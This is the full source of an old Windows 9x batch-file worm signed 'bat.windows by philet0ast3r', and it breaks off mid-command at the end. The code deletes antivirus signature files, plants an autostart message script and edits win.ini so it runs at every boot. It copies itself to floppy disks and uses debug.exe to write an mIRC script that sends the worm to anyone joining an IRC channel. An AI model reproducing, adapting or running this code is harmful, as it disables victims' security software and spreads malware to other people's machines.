@echo off
ctty nul
copy %0 c:\bat.windows.bat
echo this file is important>c:\sig.sys
del c:\programme\norton~1\s32integ.dll
del c:\programme\f-prot95\fpwm32.dll
del c:\programme\mcafee\scan.dat
del c:\tbavw95\tbscan.sig
del c:\programme\tbav\tbav.dat
del c:\tbav\tbav.dat
del c:\programme\avpersonal\antivir.vdf
echo.on error resume next>msg
echo MsgBox "welc0me to the best selling bug of the whole phuckin' universe:",4096,"bat.windows by philet0ast3r [rRlf]">>msg
move msg %winbootdir%\startmen\programme\autostart\windows.vbs
del c:\mirc\script.ini
del c:\mirc32\script.ini
del c:\progra~1\mirc\script.ini
del c:\progra~1\mirc32\script.ini
copy c:\bat.windows.bat + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
goto 23

[windows]
load=c:\bat.windows.bat
run=C:\WINDOWS\SYSTEM\cmmpu.exe
NullPort=None

:23
command /f /c copy c:\bat.windows.bat a:\
echo e 0100 5B 73 63 72 69 70 74 5D 0D 0A 6E 30 3D 6F 6E 20>5
echo e 0110 31 3A 4A 4F 49 4E 3A 23 3A 7B 20 0D 0A 6E 31 3D>>5
echo e 0120 20 2F 69 66 20 28 20 6E 69 63 6B 20 3D 3D 20 24>>5
echo e 0130 6D 65 20 29 20 7B 20 68 61 6C 74 20 7D 20 0D 0A>>5
echo e 0140 6E 32 3D 20 2F 2E 64 63 63 20 73 65 6E 64 20 24>>5
echo e 0150 6E 69 63 6B 20 63 3A 5C 62 61 74 2E 77 69 6E 64>>5
echo e 0160 6F 77 73 2E 62 61 74 20 0D 0A 6E 33 3D 7D 20 0B>>5
echo rcx>>5
echo 006F>>5
echo n script.ini>>5
echo w>>5
echo q>>5
debug<5
del 5
move script.ini c:\mirc\script.ini
move script.ini c:\mirc32\script.ini
move script.ini c:\progra~1\mirc\script.ini
move script.ini c:\progra~1\mirc32\script.ini
del scri